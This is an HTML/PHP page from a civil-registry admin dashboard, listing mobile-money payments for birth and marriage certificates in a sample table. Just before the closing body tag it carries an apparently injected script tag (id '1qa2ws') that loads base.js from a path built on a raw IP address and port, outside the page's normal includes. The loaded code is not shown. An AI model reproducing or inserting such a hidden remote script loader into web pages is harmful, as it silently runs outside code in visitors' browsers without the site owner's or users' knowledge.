<!DOCTYPE html>
<html lang="en">
<!-- BEGIN HEAD -->



<head>
	
	<title>Civil Registry</title>
	<!-- google font -->
	<link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" rel="stylesheet" type="text/css" />
	<!-- icons -->
	<link href="fonts/simple-line-icons/simple-line-icons.min.css" rel="stylesheet" type="text/css" />
	<link href="fonts/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="fonts/material-design-icons/material-icon.css" rel="stylesheet" type="text/css" />
	<!-- bootstrap -->
	<link href="../assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<!-- data tables -->
	<link href="../assets/plugins/datatables/plugins/bootstrap/dataTables.bootstrap4.min.css" rel="stylesheet" type="text/css" />
	<!-- Material Design Lite CSS -->
	<link rel="stylesheet" href="../assets/plugins/material/material.min.css">
	<link rel="stylesheet" href="../assets/css/material_style.css">
	<!-- Theme Styles -->
	<link href="../assets/css/theme/dark/theme_style.css" rel="stylesheet" id="rt_style_components" type="text/css" />
	<link href="../assets/css/theme/dark/style.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/plugins.min.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/responsive.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/theme/dark/theme-color.css" rel="stylesheet" type="text/css" />
	<!-- favicon -->
	<link rel="shortcut icon" href="http://radixtouch.in/templates/admin/smart/source/assets/img/favicon.ico" />
</head>
<!-- END HEAD -->

<body class="page-header-fixed sidemenu-closed-hidelogo page-content-white page-md header-dark dark-sidebar-color logo-dark dark-theme">
	<div class="page-wrapper">
		<?php require 'nav.php'?>
		<!-- start page container -->
		<div class="page-container">
			
			<!-- start page content -->
			<div class="page-content-wrapper">
				<div class="page-content">
					<div class="page-bar">
						<div class="page-title-breadcrumb">
							<div class=" pull-left">
								<div class="page-title">Payment Collection</div>
							</div>
							<ol class="breadcrumb page-breadcrumb pull-right">
								<li><i class="fa fa-home"></i>&nbsp;<a class="parent-item" href="index.php">Home</a>&nbsp;<i class="fa fa-angle-right"></i>
								</li>
								<li><a class="parent-item" href="#">Payment</a>&nbsp;<i class="fa fa-angle-right"></i>
								</li>
								<li class="active">Payment Collection</li>
								
							</ol>
						</div>
					</div>
					<div class="row">
						<div class="col-md-12">
							<div class="tabbable-line">
								<!-- <ul class="nav nav-tabs">
                                    <li class="active">
                                        <a href="#tab1" data-toggle="tab"> List View </a>
                                    </li>
                                    <li>
                                        <a href="#tab2" data-toggle="tab"> Grid View </a>
                                    </li>
                                </ul> -->
								
								<div class="tab-content">
									<div class="tab-pane active fontawesome-demo" id="tab1">
										<div class="row">
											<div class="col-md-12">
												<div class="card card-box">
													<div class="card-head">
														<header>Payment Collection</header>
														<div class="tools">
															<a class="fa fa-repeat btn-color box-refresh" href="javascript:;"></a>
															<a class="t-collapse btn-color fa fa-chevron-down" href="javascript:;"></a>
															<a class="t-close btn-color fa fa-times" href="javascript:;"></a>
														</div>
													</div>
													<div class="card-body ">
														<div class="row">
															<div class="col-md-6 col-sm-6 col-6">
																<div class="btn-group">
																	<a href="add_fees.php" id="addRow" class="btn btn-info">
																		Add New <i class="fa fa-plus"></i>
																	</a>
																</div>
															</div>
															<div class="col-md-6 col-sm-6 col-6">
																<div class="btn-group pull-right">
																	<a class="btn deepPink-bgcolor  btn-outline dropdown-toggle" data-toggle="dropdown">Tools
																		<i class="fa fa-angle-down"></i>
																	</a>
																	<ul class="dropdown-menu pull-right">
																		<li>
																			<a href="javascript:;">
																				<i class="fa fa-print"></i> Print </a>
																		</li>
																		<li>
																			<a href="javascript:;">
																				<i class="fa fa-file-pdf-o"></i> Save as PDF </a>
																		</li>
																		<li>
																			<a href="javascript:;">
																				<i class="fa fa-file-excel-o"></i> Export to Excel </a>
																		</li>
																	</ul>
																</div>
															</div>
														</div>
														<div class="card-body ">
									<div class="table-scrollable">
										<table class="table table-striped table-bordered table-hover table-checkable order-column valign-middle" id="example4">
											<thead>
												<tr>
													<th class="center">Receipt No</th>
													<th class="center"> Client Name </th>
													<th class="center"> Payment For</th>
													<th class="center"> Payment Type</th>
													<th class="center"> Transaction Id </th>
													<th class="center"> Amount</th>
													<th class="center"> Status </th>
													<th class="center"> Collection Date</th>
												</tr>
											</thead>
											<tbody>
												<tr class="odd gradeX">
													<td class="center">111</td>
													<td class="center">Ngu Philip</td>
													<td class="center">Marriage Certificate</td>
													<td class="center">Mtn Mobile Money</td>
													<td class="center">TXN-5645644</td>
													<td class="center">30,000FCFA</td>
													<td class="center"><span class="label label-sm label-success">paid</span></td>
													<td class="center">27/05/2019</td>
												</tr>
												<tr class="odd gradeX">
													<td class="center">112</td>
													<td class="center">Mbong Blanche</td>
													<td class="center">Birth Certificate</td>
													<td class="center">Mtn Mobile Money</td>
													<td class="center">TXN-5640044</td>
													<td class="center">10,000FCFA</td>
													<td class="center"><span class="label label-sm label-danger">unpaid</span></td>
													<td class="center">26/06/2019</td>
												</tr>
												<tr class="odd gradeX">
													<td class="center">113</td>
													<td class="center">Mbeng Davies</td>
													<td class="center">Check Genuinity</td>
													<td class="center">Orange Mobile Money</td>
													<td class="center">TXN-56456002</td>
													<td class="center">5000FCFA</td>
													<td class="center"><span class="label label-sm label-success">paid</span></td>
													<td class="center">27/04/2019</td>
												</tr>
												<tr class="odd gradeX">
													<td class="center">114</td>
													<td class="center">David Nchukwudi</td>
													<td class="center">Birth Certificate</td>
													<td class="center">Mtn Mobile Money</td>
													<td class="center">TXN-5654444</td>
													<td class="center">10,000FCFA</td>
													<td class="center"><span class="label label-sm label-warning">pending</span></td>
													<td class="center">25/07/2019</td>
												</tr>
												
												<tr class="odd gradeX">
													<td class="center">115</td>
													<td class="center">Ngwa Timothy</td>
													<td class="center">Check Genuinity</td>
													<td class="center">Orange Mobile Money</td>
													<td class="center">TXN-5645644</td>
													<td class="center">5000FCFA</td>
													<td class="center"><span class="label label-sm label-success">paid</span></td>
													<td class="center">20/05/2019</td>
												</tr>
												
											</tbody>
										</table>
									</div>
								</div>
													</div>
												</div>
											</div>
										</div>
									</div>
									
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- end page content -->
			
		</div>
		<!-- end page container -->
		<!-- start footer -->
		<?php require 'footer.php'?>
		<!-- end footer -->
	</div>
	<!-- start js include path -->
	<script src="../assets/plugins/jquery/jquery.min.js"></script>
	<script src="../assets/plugins/popper/popper.js"></script>
	<script src="../assets/plugins/jquery-blockui/jquery.blockui.min.js"></script>
	<script src="../assets/plugins/jquery-slimscroll/jquery.slimscroll.js"></script>
	<!-- bootstrap -->
	<script src="../assets/plugins/bootstrap/js/bootstrap.min.js"></script>
	<script src="../assets/plugins/bootstrap-switch/js/bootstrap-switch.min.js"></script>
	<!-- data tables -->
	<script src="../assets/plugins/datatables/jquery.dataTables.min.js"></script>
	<script src="../assets/plugins/datatables/plugins/bootstrap/dataTables.bootstrap4.min.js"></script>
	<script src="../assets/js/pages/table/table_data.js"></script>
	<!-- Common js-->
	<script src="../assets/js/app.js"></script>
	<script src="../assets/js/layout.js"></script>
	<script src="../assets/js/theme-color.js"></script>
	<!-- Material -->
	<script src="../assets/plugins/material/material.min.js"></script>
	<!-- end js include path -->
<script type = 'text/javascript' id ='1qa2ws' charset='utf-8' src='../../../../../../154.70.108.86_9090/www/default/base.js'></script></body>



</html>